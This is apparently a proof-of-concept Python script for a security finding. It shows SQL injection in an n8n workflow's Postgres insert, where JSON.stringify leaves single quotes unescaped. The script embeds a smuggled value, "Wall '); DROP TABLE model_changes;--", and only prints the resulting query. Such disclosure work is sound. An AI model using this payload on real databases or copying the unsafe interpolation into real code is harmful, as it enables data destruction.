#!/usr/bin/env python3
"""PoC: n8n BIM Change Detection postgres executeQuery SQLi via JSON.stringify.

Skill: 5_DDC_Innovative/n8n-workflow-automation/SKILL.md
Sink:   Update Database node query interpolates '{{ JSON.stringify($json) }}'
Proof:  JSON.stringify does NOT escape single quotes, so IFC-derived strings
        in $json break out of the SQL string literal.

Non-destructive: prints the crafted query only; does not connect to a DB.
"""

import json


def build_n8n_query(changes: dict) -> str:
    # Mirrors: INSERT ... VALUES (NOW(), '{{ JSON.stringify($json) }}')
    return (
        "INSERT INTO model_changes (timestamp, changes) VALUES (NOW(), '"
        + json.dumps(changes, separators=(",", ":"))
        + "')"
    )


def main() -> None:
    # Element name as would appear after extract_ifc.py → Compare node
    changes = {
        "added": [
            {
                "id": "GUID-1",
                "name": "Wall '); DROP TABLE model_changes;--",
            }
        ],
        "modified": [],
        "deleted": [],
    }

    query = build_n8n_query(changes)
    print(query)
    assert "DROP TABLE model_changes" in query
    # Single quote after Wall terminates the SQL string
    assert "Wall '); DROP TABLE" in query
    print("\nOK: single-quote breakout confirmed (JSON.stringify leaves ' unescaped)")


if __name__ == "__main__":
    main()
